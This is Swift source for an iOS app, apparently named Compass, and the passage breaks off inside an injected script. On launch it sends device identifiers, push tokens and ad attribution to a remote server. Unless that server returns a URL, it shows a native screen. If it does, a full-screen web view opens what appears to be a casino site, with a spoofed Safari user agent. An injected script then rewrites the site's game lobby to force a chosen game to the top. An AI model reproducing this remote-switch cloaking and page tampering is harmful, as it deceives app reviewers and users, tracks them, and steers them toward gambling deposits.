import AdjustSdk
import AdSupport
import AppTrackingTransparency
import SwiftUI
import UIKit
import UserNotifications

struct CompassLaunchRouter: View {
    @State private var activeLandingURL: String?
    @State private var didActivate = false
    @State private var usesNativeExperience = false
    @State private var routingTask: Task<Void, Never>?
    private let notificationOpenEvents = NotificationCenter.default
        .publisher(for: .compassNotificationActivated)

    var body: some View {
        ZStack {
            if usesNativeExperience {
                ContentView(startAtNativeContent: true)
            } else {
                PremiumBackground()
                LoadingView()
            }
        }
        .onReceive(notificationOpenEvents) { _ in
            routeLaunch()
        }

        .onAppear {
            activateOnce()
        }
        .fullScreenCover(isPresented: .constant(activeLandingURL != nil)) {
            CompassWebContainer(destination: activeLandingURL ?? "")
                .ignoresSafeArea()
        }
    }

    private func activateOnce() {
        guard !didActivate else { return }
        didActivate = true

        if !UserDefaults.standard.bool(forKey: CompassSessionCache.pendingPushKey),
           let cached = cachedLandingAddress() {
            activeLandingURL = cached
        }
        routeLaunch()
    }

    private func routeLaunch() {
        guard routingTask == nil else { return }
        routingTask = Task { @MainActor in
            await collectLaunchSignals()
            guard !Task.isCancelled else {
                routingTask = nil
                return
            }
            let pushContext = CompassSessionCache.consumePushContext()
            let foundWebExperience = await resolveLandingPage(pushContext: pushContext)
            routingTask = nil
            if !Task.isCancelled && !foundWebExperience && activeLandingURL == nil {
                print("REMOTE FLOW: opening native because bootstrap did not return a web URL")
                usesNativeExperience = true
            }
            if UserDefaults.standard.bool(forKey: CompassSessionCache.pendingPushKey) {
                routeLaunch()
            }
        }
    }

    private func collectLaunchSignals() async {
        await prepareRemoteNotifications()
        try? await Task.sleep(nanoseconds: 500_000_000)
        await resolveTrackingPermission()

        for second in 0...15 {
            if CompassSessionCache.adjustAttributionJSON != nil, CompassSessionCache.firebaseToken != nil {
                return
            }
            guard second < 15, !Task.isCancelled else { return }
            try? await Task.sleep(nanoseconds: 1_000_000_000)
        }
    }

    @MainActor
    private func prepareRemoteNotifications() async {
        let center = UNUserNotificationCenter.current()
        let settings = await center.notificationSettings()
        if settings.authorizationStatus == .notDetermined {
            _ = try? await center.requestAuthorization(options: [.alert, .badge, .sound])
        }
        UIApplication.shared.registerForRemoteNotifications()
    }

    @MainActor
    private func resolveTrackingPermission() async {
        guard #available(iOS 14.5, *) else {
            UserDefaults.standard.set(
                ASIdentifierManager.shared().advertisingIdentifier.uuidString,
                forKey: "compass.bridge.idfa"
            )
            return
        }

        let currentStatus = ATTrackingManager.trackingAuthorizationStatus
        if currentStatus != .notDetermined {
            let idfa = currentStatus == .authorized
                ? ASIdentifierManager.shared().advertisingIdentifier.uuidString
                : ""
            UserDefaults.standard.set(idfa, forKey: "compass.bridge.idfa")
            return
        }

        for _ in 0..<10 where UIApplication.shared.applicationState != .active {
            try? await Task.sleep(nanoseconds: 300_000_000)
        }
        guard UIApplication.shared.applicationState == .active else { return }

        let status = await Adjust.requestAppTrackingAuthorization()
        let idfa = status == 3
            ? ASIdentifierManager.shared().advertisingIdentifier.uuidString
            : ""
        UserDefaults.standard.set(idfa, forKey: "compass.bridge.idfa")
    }
}

#Preview { CompassLaunchRouter() }


@preconcurrency import WebKit

private enum CompassBridgeContract {
    static let entryAddress = "https://giftforyou.cyou/app.php"
    static let browserSignature = "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1"
}

private struct CompassHandshakePayload {
    let attribution: [String: Any]
    let firebaseToken: String
    let adjustID: String
    let idfa: String
    let deviceModel: String
    let clientID: String?
    let pushID: String?
    let openedFromPush: Bool

    func urlParameters() -> [URLQueryItem] {
        var items = [
            URLQueryItem(name: "firebase_push_token", value: firebaseToken),
            URLQueryItem(name: "adjust_id", value: adjustID),
            URLQueryItem(name: "idfa", value: idfa),
            URLQueryItem(name: "device_model", value: deviceModel),
            URLQueryItem(name: "isfrompush", value: openedFromPush ? "1" : "0")
        ]
        if let clientID, UUID(uuidString: clientID) != nil {
            items.append(URLQueryItem(name: "client_id", value: clientID))
        }
        if openedFromPush, let pushID, !pushID.isEmpty {
            items.append(URLQueryItem(name: "push_id", value: pushID))
        }
        return items
    }

    func requestBody() -> Data {
        let body: [String: Any] = [
            "adjust": attribution,
            "referrer": "utm_source=appstore&utm_medium=organic"
        ]
        return (try? JSONSerialization.data(withJSONObject: body, options: [])) ?? Data("{}".utf8)
    }
}

private struct LandingResponse: Decodable {
    let sessionID: String?
    let clientID: String?
    let destination: String?

    enum CodingKeys: String, CodingKey {
        case sessionID = "session_id"
        case clientID = "client_id"
        case destination = "response"
    }

    var destinationWithSession: URL? {
        guard let destination = destination?.trimmingCharacters(in: .whitespacesAndNewlines),
              var components = URLComponents(string: destination),
              let scheme = components.scheme?.lowercased(),
              ["http", "https"].contains(scheme), components.host != nil else { return nil }
        guard let sessionID = sessionID?.trimmingCharacters(in: .whitespacesAndNewlines),
              !sessionID.isEmpty else { return components.url }

        var items = components.queryItems ?? []
        // The landing page uses this value to construct registration/deposit postbacks.
        // Keep a session already embedded by the server, otherwise pass its separate field.
        if items.contains(where: { $0.name == "session_id" && !($0.value ?? "").isEmpty }) {
            return components.url
        }
        items.removeAll { $0.name == "session_id" }
        items.append(URLQueryItem(name: "session_id", value: sessionID))
        components.queryItems = items
        return components.url
    }
}

private enum CompassChannelFailure: Error {
    case invalidEntryAddress
    case invalidRouteAddress
    case missingRouteHeader
    case nonHTTPResponse
    case rejectedStatus(Int)
}

private struct CompassBridgeClient {
    let clientUUID: String

    func fetchBridgeAddress() async throws -> URL {
        guard let entryURL = URL(string: CompassBridgeContract.entryAddress) else {
            throw CompassChannelFailure.invalidEntryAddress
        }
        var probe = URLRequest(url: entryURL)
        probe.httpMethod = "POST"
        attachInstallationHeaders(to: &probe)

        let (_, response) = try await URLSession.shared.data(for: probe)
        guard let http = response as? HTTPURLResponse else {
            throw CompassChannelFailure.nonHTTPResponse
        }
        guard (200...299).contains(http.statusCode) else {
            throw CompassChannelFailure.rejectedStatus(http.statusCode)
        }
        guard let rawRoute = http.value(forHTTPHeaderField: "service-link")?
            .trimmingCharacters(in: .whitespacesAndNewlines),
              let route = URL(string: rawRoute),
              route.scheme != nil else {
            throw CompassChannelFailure.missingRouteHeader
        }
        return route
    }

    func fetchLanding(at route: URL, signal: CompassHandshakePayload) async throws -> LandingResponse {
        guard var parts = URLComponents(url: route, resolvingAgainstBaseURL: false) else {
            throw CompassChannelFailure.invalidRouteAddress
        }
        let sessionFields = Set(["firebase_push_token", "adjust_id", "idfa", "device_model", "isfrompush", "client_id", "push_id"])
        parts.queryItems = (parts.queryItems ?? []).filter { !sessionFields.contains($0.name) }
            + signal.urlParameters()
        guard let destination = parts.url else {
            throw CompassChannelFailure.invalidRouteAddress
        }

        var request = URLRequest(url: destination)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        attachInstallationHeaders(to: &request)
        request.httpBody = signal.requestBody()

        let (data, response) = try await URLSession.shared.data(for: request)
        guard let http = response as? HTTPURLResponse else {
            throw CompassChannelFailure.nonHTTPResponse
        }
        guard (200...299).contains(http.statusCode) else {
            throw CompassChannelFailure.rejectedStatus(http.statusCode)
        }
        return try JSONDecoder().decode(LandingResponse.self, from: data)
    }

    private func attachInstallationHeaders(to request: inout URLRequest) {
        request.setValue(clientUUID, forHTTPHeaderField: "client-uuid")
        request.setValue(CompassBridgeContract.browserSignature, forHTTPHeaderField: "User-Agent")
    }
}

extension CompassLaunchRouter {
    @discardableResult
    private func resolveLandingPage(pushContext: (openedFromPush: Bool, pushID: String?)) async -> Bool {
        let signal = await composeHandshake(pushContext: pushContext)
        let relay = CompassBridgeClient(clientUUID: CompassSessionCache.clientUUID)

        do {
            let route = try await resolveBridgeURL(using: relay)
            let reply = try await relay.fetchLanding(at: route, signal: signal)
            CompassSessionCache.storeServerClientID(reply.clientID)
            guard !Task.isCancelled,
                  let destinationURL = reply.destinationWithSession else {
                return await recoverCachedLanding()
            }

            let destination = destinationURL.absoluteString
            UserDefaults.standard.set(destination, forKey: CompassSessionCache.responseLinkKey)
            UserDefaults.standard.set(destination, forKey: "compass.browser.lastURL")
            await MainActor.run {
                activeLandingURL = destination
                NotificationCenter.default.post(name: .compassLandingChanged, object: destinationURL)
            }
            return true
        } catch {
            if Task.isCancelled { return false }
            print("GIFT REMOTE:", String(describing: error))
            return await recoverCachedLanding()
        }
    }

    private func composeHandshake(
        pushContext: (openedFromPush: Bool, pushID: String?)
    ) async -> CompassHandshakePayload {
        let attribution = normalizedAttribution()
        let adjustID = await Adjust.adid() ?? ""
        let device = await MainActor.run { UIDevice.current.model }
        return CompassHandshakePayload(
            attribution: attribution,
            firebaseToken: CompassSessionCache.firebaseToken ?? "null",
            adjustID: adjustID,
            idfa: UserDefaults.standard.string(forKey: "compass.bridge.idfa") ?? "",
            deviceModel: device,
            clientID: CompassSessionCache.clientID,
            pushID: pushContext.pushID,
            openedFromPush: pushContext.openedFromPush
        )
    }

    private func normalizedAttribution() -> [String: Any] {
        guard let jsonString = CompassSessionCache.adjustAttributionJSON,
              let jsonData = jsonString.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: jsonData) as? [String: Any] else {
            return [:]
        }
        return [
            "trackerToken": json["trackerToken"] as? String ?? "",
            "trackerName": json["trackerName"] as? String ?? "",
            "network": json["network"] as? String ?? "",
            "campaign": json["campaign"] as? String ?? "",
            "adgroup": json["adgroup"] as? String ?? "",
            "creative": json["creative"] as? String ?? "",
            "clickLabel": json["clickLabel"] as? String ?? "",
            "costType": json["costType"] as? String ?? "",
            "costAmount": json["costAmount"] as? Double ?? 0,
            "costCurrency": json["costCurrency"] as? String ?? "",
            "jsonResponse": jsonString
        ]
    }

    private func resolveBridgeURL(using relay: CompassBridgeClient) async throws -> URL {
        if let saved = UserDefaults.standard.string(forKey: CompassSessionCache.serviceLinkKey),
           let route = URL(string: saved), route.scheme != nil {
            print("GIFT REMOTE: restored route")
            return route
        }
        let route = try await relay.fetchBridgeAddress()
        UserDefaults.standard.set(route.absoluteString, forKey: CompassSessionCache.serviceLinkKey)
        print("GIFT REMOTE: discovered route")
        return route
    }

    private func recoverCachedLanding() async -> Bool {
        guard let cached = cachedLandingAddress() else { return false }
        await MainActor.run { activeLandingURL = cached }
        return true
    }

    private func cachedLandingAddress() -> String? {
        guard let cached = UserDefaults.standard.string(forKey: CompassSessionCache.responseLinkKey)?
            .trimmingCharacters(in: .whitespacesAndNewlines),
              !cached.isEmpty,
              let url = URL(string: cached),
              url.scheme != nil else {
            return nil
        }
        return cached
    }

}

struct CompassWebContainer: UIViewControllerRepresentable {
    let destination: String

    func makeUIViewController(context: Context) -> CompassWebController {
        let controller = CompassWebController()
        controller.initialAddress = destination
        return controller
    }

    func updateUIViewController(_ controller: CompassWebController, context: Context) {
        controller.applyDestination(destination)
    }
}

private struct FeaturedGameDirective: Equatable {
    let gameId: String
    let provider: String
}

private struct PreparedWebAddress {
    let url: URL
    let rule: FeaturedGameDirective?
}

private enum CompassFeaturedGameLoader {
    static let catalogAddress = "https://buddyspin.aramuz.net/frontapi/buddyspin/gameList"

    static func load(_ rule: FeaturedGameDirective) async -> String? {
        for category in ["original", ""] {
            guard !Task.isCancelled else { return nil }
            var parts = URLComponents(string: catalogAddress)!
            parts.queryItems = [
                URLQueryItem(name: "area", value: "default"),
                URLQueryItem(name: "gameProducer", value: rule.provider),
                URLQueryItem(name: "limit", value: "500"),
                URLQueryItem(name: "offset", value: "0")
            ]
            if !category.isEmpty { parts.queryItems?.append(URLQueryItem(name: "category", value: category)) }
            var request = URLRequest(url: parts.url!, timeoutInterval: 4)
            request.setValue(CompassBridgeContract.browserSignature, forHTTPHeaderField: "User-Agent")
            do {
                let (data, response) = try await URLSession.shared.data(for: request)
                guard let http = response as? HTTPURLResponse, (200...299).contains(http.statusCode),
                      let payload = try JSONSerialization.jsonObject(with: data) as? [String: Any],
                      let games = payload["data"] as? [[String: Any]],
                      let game = games.first(where: {
                          ($0["gpGameId"] as? String ?? $0["spGameId"] as? String) == rule.gameId
                      }) else { continue }
                let gameData = try JSONSerialization.data(withJSONObject: game)
                return String(data: gameData, encoding: .utf8)
            } catch {
                if Task.isCancelled { return nil }
            }
        }
        return nil
    }
}

final class CompassWebController: UIViewController, WKNavigationDelegate, WKScriptMessageHandler {
    var initialAddress = ""
    private var primaryWebView: WKWebView!
    private var popupWebViews: [WKWebView] = []
    private var secondaryWebView: WKWebView? { popupWebViews.last }
    private var lastLoadedAddress = ""
    private var featuredDirective: FeaturedGameDirective?
    private var processRecoveryCount = 0
    private var navigationRecoveryCount = 0
    private var preparationTask: Task<Void, Never>?
    private var preloadedGameJSON: String?
    private var preparationLoadingController: UIViewController?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .white
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(landingNotificationReceived(_:)),
            name: .compassLandingChanged,
            object: nil
        )
        Task { await mountWebContent() }
    }

    deinit {
        NotificationCenter.default.removeObserver(self)
    }

    @objc private func landingNotificationReceived(_ notification: Notification) {
        guard let url = notification.object as? URL else { return }
        openLanding(url.absoluteString)
    }
    
    override func viewWillAppear(_ animated: Bool) {
        super.viewWillAppear(animated)
        CompassBrowserRotation.webContentIsVisible = true
        applyRotationPolicy(.all)
    }
    
    override func viewWillDisappear(_ animated: Bool) {
        super.viewWillDisappear(animated)
        CompassBrowserRotation.webContentIsVisible = false
        applyRotationPolicy(.portrait)
    }

    override var supportedInterfaceOrientations: UIInterfaceOrientationMask { .all }
    override var shouldAutorotate: Bool { true }

    private func applyRotationPolicy(_ orientations: UIInterfaceOrientationMask) {
        setNeedsUpdateOfSupportedInterfaceOrientations()
        navigationController?.setNeedsUpdateOfSupportedInterfaceOrientations()
        if let scene = view.window?.windowScene {
            scene.requestGeometryUpdate(.iOS(interfaceOrientations: orientations))
        }
    }
    
    func mountWebContent() async {
        guard primaryWebView == nil else { return }
        let content = initialAddress.isEmpty
            ? (UserDefaults.standard.string(forKey: "compass.browser.lastURL") ?? "")
            : initialAddress

        guard !content.isEmpty, let rawURL = URL(string: content) else { return }
        let prepared = Self.prepareWebAddress(rawURL)
        UserDefaults.standard.set(content, forKey: "compass.browser.lastURL")
        restoreCookieSnapshot()
        await MainActor.run { self.replacePrimaryWebView(for: prepared) }
    }

    func applyDestination(_ destination: String) {
        guard destination != initialAddress else { return }
        initialAddress = destination
        openLanding(destination)
    }

    private func openLanding(_ destination: String) {
        guard let rawURL = URL(string: destination) else { return }
        let prepared = Self.prepareWebAddress(rawURL)
        UserDefaults.standard.set(destination, forKey: "compass.browser.lastURL")

        guard primaryWebView != nil else {
            initialAddress = destination
            if isViewLoaded { replacePrimaryWebView(for: prepared) }
            return
        }
        if featuredDirective != prepared.rule {
            replacePrimaryWebView(for: prepared)
        } else {
            loadAddress(to: prepared.url)
        }
    }

    private func replacePrimaryWebView(for prepared: PreparedWebAddress) {
        preparationTask?.cancel()
        showPreparationLoading()
        preparationTask = Task { @MainActor in
            let gameJSON: String?
            if let rule = prepared.rule {
                gameJSON = await CompassFeaturedGameLoader.load(rule)
            } else {
                gameJSON = nil
            }
            guard !Task.isCancelled else { return }
            if prepared.rule != nil && gameJSON == nil {
                preparationTask = nil
                let alert = UIAlertController(
                    title: "Unable to prepare games",
                    message: "The requested game could not be loaded. Please try again.",
                    preferredStyle: .alert
                )
                alert.addAction(UIAlertAction(title: "Retry", style: .default) { [weak self] _ in
                    self?.replacePrimaryWebView(for: prepared)
                })
                present(alert, animated: true)
                return
            }
            preloadedGameJSON = gameJSON
            installPrimaryWebView(for: prepared)
            preparationTask = nil
        }
    }

    private func showPreparationLoading() {
        guard preparationLoadingController == nil else { return }
        let loading = UIHostingController(rootView: ZStack { PremiumBackground(); LoadingView() })
        addChild(loading)
        loading.view.frame = view.bounds
        loading.view.autoresizingMask = [.flexibleWidth, .flexibleHeight]
        view.addSubview(loading.view)
        loading.didMove(toParent: self)
        preparationLoadingController = loading
    }

    private func installPrimaryWebView(for prepared: PreparedWebAddress) {
        for popup in popupWebViews {
            popup.removeFromSuperview()
        }
        popupWebViews.removeAll()

        if let primaryWebView {
            primaryWebView.configuration.userContentController.removeScriptMessageHandler(forName: "compassBridgeLog")
            primaryWebView.removeFromSuperview()
        }

        featuredDirective = prepared.rule
        lastLoadedAddress = ""
        processRecoveryCount = 0
        let config = buildWebConfiguration(rule: prepared.rule)
        let surface = WKWebView(frame: .zero, configuration: config)
        surface.customUserAgent = CompassBridgeContract.browserSignature
        surface.navigationDelegate = self
        surface.uiDelegate = self
        surface.allowsBackForwardNavigationGestures = true
        surface.translatesAutoresizingMaskIntoConstraints = false
        primaryWebView = surface

        if let loadingView = preparationLoadingController?.view {
            view.insertSubview(surface, belowSubview: loadingView)
        } else {
            view.addSubview(surface)
        }
        NSLayoutConstraint.activate([
            surface.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
            surface.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
            surface.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            surface.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor)
        ])
        loadAddress(to: prepared.url)
    }

    private func buildWebConfiguration(rule: FeaturedGameDirective?) -> WKWebViewConfiguration {
        let config = WKWebViewConfiguration()
        config.websiteDataStore = .default()
        config.preferences.javaScriptCanOpenWindowsAutomatically = true
        config.defaultWebpagePreferences.allowsContentJavaScript = true
        if let rule {
            let script = WKUserScript(
                source: Self.featuredGameInterceptor(rule: rule, preloadedGameJSON: preloadedGameJSON),
                injectionTime: .atDocumentStart,
                forMainFrameOnly: false
            )
            config.userContentController.addUserScript(script)
            config.userContentController.add(self, name: "compassBridgeLog")
        }
        return config
    }

    private static func prepareWebAddress(_ url: URL) -> PreparedWebAddress {
        guard var comps = URLComponents(url: url, resolvingAgainstBaseURL: false),
              let items = comps.queryItems, !items.isEmpty else {
            return PreparedWebAddress(url: url, rule: nil)
        }

        var capturedRaw: String?
        var filtered: [URLQueryItem] = []
        filtered.reserveCapacity(items.count)

        for item in items {
            if item.name.lowercased() == "changetop" {
                if let value = item.value, !value.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
                    capturedRaw = value
                }
                continue
            }
            filtered.append(item)
        }

        comps.queryItems = filtered.isEmpty ? nil : filtered
        let rule = capturedRaw.flatMap(parseFeaturedGame)
        if let rule {
            print("changetop received:", "\(rule.gameId)___\(rule.provider)")
        } else {
            print("changetop absent: game substitution disabled")
        }
        return PreparedWebAddress(url: comps.url ?? url, rule: rule)
    }

    private static func parseFeaturedGame(_ raw: String) -> FeaturedGameDirective? {
        let parts = raw.components(separatedBy: "___")
        guard parts.count == 2 else { return nil }

        let gameId = parts[0].trimmingCharacters(in: .whitespacesAndNewlines)
        let provider = parts[1].trimmingCharacters(in: .whitespacesAndNewlines)

        guard !gameId.isEmpty, !provider.isEmpty else { return nil }
        return FeaturedGameDirective(gameId: gameId, provider: provider)
    }

    private static func jsEscaped(_ value: String) -> String {
        value
            .replacingOccurrences(of: "\\", with: "\\\\")
            .replacingOccurrences(of: "\"", with: "\\\"")
            .replacingOccurrences(of: "\n", with: "\\n")
            .replacingOccurrences(of: "\r", with: "\\r")
    }
    
    func loadAddress(to url: URL) {
        guard lastLoadedAddress != url.absoluteString else { return }
        lastLoadedAddress = url.absoluteString
        navigationRecoveryCount = 0
        primaryWebView.load(URLRequest(url: url))
    }

    func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
        guard processRecoveryCount < 2 else {
            print("Compass WebKit recovery limit reached")
            return
        }
        processRecoveryCount += 1
        print("Compass WebKit process terminated; reloading, attempt", processRecoveryCount)
        if let url = webView.url {
            webView.load(URLRequest(url: url))
        } else if webView === primaryWebView, let url = URL(string: lastLoadedAddress) {
            webView.load(URLRequest(url: url))
        }
    }
    
    func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        if webView === primaryWebView, preparationTask == nil, let loading = preparationLoadingController {
            loading.willMove(toParent: nil)
            loading.view.removeFromSuperview()
            loading.removeFromParent()
            preparationLoadingController = nil
        }
        persistCookieSnapshot()

        if webView === secondaryWebView {
            print("Compass popup loaded:", webView.url?.host ?? "unknown host")
        }

        webView.evaluateJavaScript("window.__giftCompassPlacementReady === true") { result, _ in
            print("Interceptor installed:", result as? Bool ?? false)
        }
    }
    
    func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse,
                 decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let response = navigationResponse.response as? HTTPURLResponse {
            let status = response.statusCode
            print("HTTP Status: \(status)")
            
            if status == 403 || status == 429 {
                print("Recoverable HTTP status, keeping WebView visible: \(status)")
            }
            else if (300...399).contains(status) {
                print("Redirect status, allowing navigation")
            }
            else if status == 200 {
                print("Main content response accepted")
            }
            else if status >= 400 {
                print("Ошибка Сервер вернул ошибку (\(status)).")
            }
        }
        decisionHandler(.allow)
    }

    func webView(
        _ webView: WKWebView,
        decidePolicyFor navigationAction: WKNavigationAction,
        decisionHandler: @escaping (WKNavigationActionPolicy) -> Void
    ) {
        guard let url = navigationAction.request.url else {
            decisionHandler(.allow)
            return
        }

        if Self.opensInExternalApp(url) {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
            decisionHandler(.cancel)
            return
        }

        decisionHandler(.allow)
    }

    private static func opensInExternalApp(_ url: URL) -> Bool {
        guard let scheme = url.scheme?.lowercased() else { return false }
        return ["tg", "telegram", "mailto", "tel", "sms", "whatsapp", "itms-apps"].contains(scheme)
    }

    func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        handleUnsupportedNavigation(error, in: webView)
    }

    func webView(
        _ webView: WKWebView,
        didFailProvisionalNavigation navigation: WKNavigation!,
        withError error: Error
    ) {
        handleUnsupportedNavigation(error, in: webView)
    }

    private func handleUnsupportedNavigation(_ error: Error, in webView: WKWebView) {
        let failure = error as NSError
        if failure.domain == NSURLErrorDomain, failure.code == NSURLErrorCancelled {
            return
        }
        print("Compass navigation failed:", webView === secondaryWebView ? "popup" : "main", failure.domain, failure.code)
        let transientCodes = [NSURLErrorTimedOut, NSURLErrorCannotFindHost, NSURLErrorCannotConnectToHost,
                              NSURLErrorNetworkConnectionLost, NSURLErrorDNSLookupFailed, NSURLErrorNotConnectedToInternet]
        if webView === primaryWebView, failure.domain == NSURLErrorDomain,
           transientCodes.contains(failure.code), navigationRecoveryCount < 2,
           let retryURL = (failure.userInfo[NSURLErrorFailingURLErrorKey] as? URL)
                ?? webView.url ?? URL(string: lastLoadedAddress) {
            navigationRecoveryCount += 1
            DispatchQueue.main.asyncAfter(deadline: .now() + Double(navigationRecoveryCount)) { [weak self, weak webView] in
                guard let self, let webView, webView === self.primaryWebView,
                      self.lastLoadedAddress == retryURL.absoluteString || webView.url == retryURL else { return }
                webView.load(URLRequest(url: retryURL))
            }
            return
        }
        guard failure.domain == NSURLErrorDomain,
              failure.code == NSURLErrorUnsupportedURL else {
            return
        }

        let failedURL = (failure.userInfo[NSURLErrorFailingURLErrorKey] as? URL)
            ?? (failure.userInfo[NSURLErrorFailingURLStringErrorKey] as? String).flatMap(URL.init(string:))
            ?? webView.url
        guard let failedURL,
              let scheme = failedURL.scheme?.lowercased(),
              scheme != "http", scheme != "https" else {
            return
        }
        UIApplication.shared.open(failedURL, options: [:], completionHandler: nil)
    }
    
    func restoreCookieSnapshot() {
        let ud: UserDefaults = UserDefaults.standard
        let data: Data? = ud.object(forKey: "compass.browser.cookies") as? Data
        if let cookie = data {
            do {
                let datas: NSArray? = try NSKeyedUnarchiver.unarchivedObject(ofClass: NSArray.self, from: cookie)
                if let cookies = datas {
                    for c in cookies {
                        if let cookieObject = c as? HTTPCookie {
                            HTTPCookieStorage.shared.setCookie(cookieObject)
                        }
                    }
                }
            } catch {
                print(error.localizedDescription)
            }
        }
    }
    
    func persistCookieSnapshot() {
        let cookieJar: HTTPCookieStorage = HTTPCookieStorage.shared
        if let cookies = cookieJar.cookies {
            do {
                let data: Data = try NSKeyedArchiver.archivedData(withRootObject: cookies, requiringSecureCoding: false)
                let ud: UserDefaults = UserDefaults.standard
                ud.set(data, forKey: "compass.browser.cookies")
            } catch {
                print(error.localizedDescription)
            }
        }
    }

    func userContentController(_ userContentController: WKUserContentController, didReceive message: WKScriptMessage) {
        if message.name == "compassBridgeLog" {
            print("Compass Web:", message.body)
        }
    }

    fileprivate static func featuredGameInterceptor(rule: FeaturedGameDirective, preloadedGameJSON: String? = nil) -> String {
        let gameId = jsEscaped(rule.gameId)
        let provider = jsEscaped(rule.provider)

        return """
(function() {
  window.__giftCompassPlacementReady = true;
  const FEATURED_GAME_ID = "\(gameId)";
  const FEATURED_PROVIDER = "\(provider)";
  function writeCompassTrace(msg) {
    try {
      window.__giftCompassPlacementLog = window.__giftCompassPlacementLog || [];
      window.__giftCompassPlacementLog.push(String(msg));
      if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.compassBridgeLog) {
        window.webkit.messageHandlers.compassBridgeLog.postMessage(String(msg));
      }
    } catch (_) {}
  }

  let featuredGameCache = \(preloadedGameJSON ?? "null");
  let featuredGameCachedAt = featuredGameCache ? Date.now() : 0;
  const FEATURED_CACHE_WINDOW = 60 * 1000;
  const pendingLobbySnapshots = [];
  let discoveredCatalogEndpoint = "";

  function now() { return Date.now(); }

  function compactSectionKey(v) {
    return (v || "").toLowerCase().replace(/[^a-z0-9]/g, "");
  }

  function mergeGameShape(list, featuredGame) {
    const template = (Array.isArray(list) ? list.find(x => x && typeof x === "object") : null) || {};
    return Object.assign({}, template, featuredGame);
  }

  function placeFeaturedGame(arr, featuredGame, slotIndex) {
    if (!Array.isArray(arr) || !featuredGame) return false;
    const priorIndex = arr.findIndex(x => gameIdentity(x) === FEATURED_GAME_ID);
    const filtered = arr.filter(x => gameIdentity(x) !== FEATURED_GAME_ID);
    const idx = Math.max(0, Math.min(Number.isFinite(slotIndex) ? slotIndex : 0, filtered.length));
    filtered.splice(idx, 0, mergeGameShape(filtered, featuredGame));
    arr.length = 0;
    for (const it of filtered) arr.push(it);
    const resultIndex = arr.findIndex(x => gameIdentity(x) === FEATURED_GAME_ID);
    return priorIndex !== resultIndex || priorIndex !== idx;
  }

  function rewriteSectionNode(node, slotIndex) {
    if (!node || !featuredGameCache) return false;
    function rewriteArray(arr) {
      if (!Array.isArray(arr) || arr.length === 0) return false;
      const tpl = arr.find(x => x && typeof x === "object") || {};
      const mergedFeaturedGame = Object.assign({}, tpl, featuredGameCache);
      return placeFeaturedGame(arr, mergedFeaturedGame, slotIndex);
    }
    if (Array.isArray(node)) return rewriteArray(node);
    if (typeof node !== "object") return false;
    if (rewriteArray(node.data)) return true;
    if (rewriteArray(node.games)) return true;
    if (rewriteArray(node.list)) return true;
    if (rewriteArray(node.items)) return true;
    if (rewriteArray(node.content)) return true;
    return false;
  }

  function rewriteLooseSections(container) {
    if (!container || typeof container !== "object" || !featuredGameCache) return 0;
    let local = 0;
    const source = (container.games && typeof container.games === "object") ? container.games : container;
    if (!source || typeof source !== "object") return 0;
    try {
      for (const key of Object.keys(source)) {
        const n = compactSectionKey(key);
        if (n === "top" || n === "topgames" || n.endsWith("top") || n.endsWith("topgames") || n.includes("categorytop")) {
          if (rewriteSectionNode(source[key], 2)) local += 1;
        } else if (n === "trendingnow" || n.endsWith("trendingnow") || n.includes("categorytrendingnow")) {
          if (rewriteSectionNode(source[key], 0)) local += 1;
        }
      }
    } catch (_) {}
    return local;
  }

  function resolveCatalogEndpoint(seedAddress) {
    try {
      if (discoveredCatalogEndpoint) return discoveredCatalogEndpoint;
      const seed = new URL(seedAddress || "", location.href);
      if ((seed.pathname || "").toLowerCase().includes("gamelist")) {
        return seed.origin + seed.pathname;
      }
    } catch (_) {}
    return "\(CompassFeaturedGameLoader.catalogAddress)";
  }

  // The current lobby hydrates Top/Exclusive from this v2 Pinia store before
  // fetching the remaining shelves. Rewrite it during JSON.parse, before Vue
  // consumes the initial state (the site then deletes window._pinia).
  const lobbyStoreKeys = ["mf-lobby_v2-games", "mf-lobby-games", "mfLobbyGames"];

  function lobbyContainers(root) {
    if (!root || typeof root !== "object") return [];
    const candidates = [];
    function collect(node) {
      if (!node || typeof node !== "object") return;
      for (const key of lobbyStoreKeys) {
        if (node[key] && typeof node[key] === "object") candidates.push(node[key]);
      }
    }
    collect(root);
    for (const key of Object.keys(root)) collect(root[key]);
    return Array.from(new Set(candidates));
  }

  function rewriteLobbyPayload(root) {
    try {
      if (!root || typeof root !== "object") return 0;
      let featuredGame = featuredGameCache || null;
      if (!featuredGame) featuredGame = primeFeaturedGameSync(location.href);
      let patched = 0;
      writeCompassTrace("rewriteLobbyPayload:start featuredCached=" + (!!featuredGame));

      function rewriteShelf(arr, slotIndex) {
        if (!Array.isArray(arr) || arr.length === 0) return false;
        if (!featuredGame) {
          writeCompassTrace("rewriteShelf:skip-no-featuredGame index=" + slotIndex);
          return false;
        }
        const tpl = arr.find(x => x && typeof x === "object") || {};
        const mergedFeaturedGame = Object.assign({}, tpl, featuredGame);
        const before = arr.findIndex(x => gameIdentity(x) === FEATURED_GAME_ID);
        const ok = placeFeaturedGame(arr, mergedFeaturedGame, slotIndex);
        const after = arr.findIndex(x => gameIdentity(x) === FEATURED_GAME_ID);
        writeCompassTrace("rewriteShelf:index=" + slotIndex + " before=" + before + " after=" + after + " ok=" + ok);
        return ok;
      }

      function rewriteCategoryEnvelope(node, slotIndex) {
        if (!node) return false;
        if (Array.isArray(node)) return rewriteShelf(node, slotIndex);
        if (typeof node !== "object") return false;
